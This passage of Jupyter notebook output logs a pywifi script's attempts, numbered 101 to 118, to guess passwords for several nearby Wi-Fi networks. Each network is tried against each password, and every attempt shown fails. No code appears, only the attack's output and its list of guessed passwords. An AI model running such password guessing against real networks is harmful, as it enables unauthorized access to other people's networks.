    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:25,882 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 101 Fail Current WifiName: 313 Current Password: 95829812TmM\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:31,453 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: BP2197 Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:37,027 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:42,550 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: whhh Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:47,578 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: Ruoshui317 Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:53,146 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: 311 Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:43:58,713 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: 321sushe Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:04,292 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 102 Fail Current WifiName: 313 Current Password: pE15262828\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:09,860 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: BP2197 Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:15,440 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:20,957 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: whhh Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:25,973 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: Ruoshui317 Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:31,540 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: 311 Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:37,111 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: 321sushe Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:42,683 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 103 Fail Current WifiName: 313 Current Password: 18009209rEE\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:48,252 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: BP2197 Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:53,830 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:44:59,346 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: whhh Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:04,361 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: Ruoshui317 Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:09,943 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: 311 Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:15,512 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: 321sushe Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:21,083 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 104 Fail Current WifiName: 313 Current Password: UF083758\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:26,658 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: BP2197 Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:32,234 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:37,808 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: whhh Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:42,830 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: Ruoshui317 Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:48,405 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: 311 Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:53,980 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: 321sushe Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:45:59,564 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 106 Fail Current WifiName: 313 Current Password: ANR869707\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:05,139 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: BP2197 Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:10,710 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:16,288 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: whhh Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:21,305 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: Ruoshui317 Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:26,876 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: 311 Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:32,451 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: 321sushe Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:38,027 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 107 Fail Current WifiName: 313 Current Password: 9054716we\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:43,597 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: BP2197 Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:49,169 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:54,745 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: whhh Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:46:59,778 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: Ruoshui317 Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:05,347 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: 311 Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:10,910 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: 321sushe Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:16,495 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 108 Fail Current WifiName: 313 Current Password: deE51993\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:22,062 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: BP2197 Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:27,645 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:33,220 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: whhh Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:38,244 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: Ruoshui317 Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:43,819 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: 311 Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:49,391 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: 321sushe Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:47:54,979 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 109 Fail Current WifiName: 313 Current Password: 7663609ZIG\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:00,554 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: BP2197 Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:06,123 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:11,697 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: whhh Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:16,718 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: Ruoshui317 Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:22,290 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: 311 Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:27,875 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: 321sushe Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:33,439 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 111 Fail Current WifiName: 313 Current Password: 338118flI\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:39,007 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: BP2197 Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:44,579 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:50,155 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: whhh Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:48:55,190 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: Ruoshui317 Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:00,763 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: 311 Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:06,329 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: 321sushe Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:11,901 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 112 Fail Current WifiName: 313 Current Password: NoF814022\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:17,471 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: BP2197 Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:23,041 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:28,615 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: whhh Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:33,635 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: Ruoshui317 Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:39,208 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: 311 Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:44,795 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: 321sushe Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:50,364 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 113 Fail Current WifiName: 313 Current Password: 124645jw\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:49:55,933 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: BP2197 Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:01,511 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:07,083 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: whhh Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:12,104 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: Ruoshui317 Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:17,687 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: 311 Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:23,242 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: 321sushe Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:28,812 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 114 Fail Current WifiName: 313 Current Password: yP338082\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:34,381 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: BP2197 Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:39,955 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:45,545 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: whhh Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:50,568 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: Ruoshui317 Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:50:56,144 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: 311 Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:01,720 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: 321sushe Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:07,295 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 115 Fail Current WifiName: 313 Current Password: 107777Ly\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:12,871 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: BP2197 Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:18,445 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:24,022 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: whhh Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:29,042 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: Ruoshui317 Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:34,612 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: 311 Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:40,187 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: 321sushe Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:45,763 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 116 Fail Current WifiName: 313 Current Password: SXA36875\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:51,338 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: BP2197 Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:51:56,919 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:02,485 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: whhh Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:07,498 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: Ruoshui317 Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:13,071 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: 311 Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:18,636 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: 321sushe Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:24,210 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 117 Fail Current WifiName: 313 Current Password: 67126287ZzX\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:29,783 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: BP2197 Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:52:35,350 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 118 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: JBo643795\n"
     ]
    },
    {
     "name": "stderr",
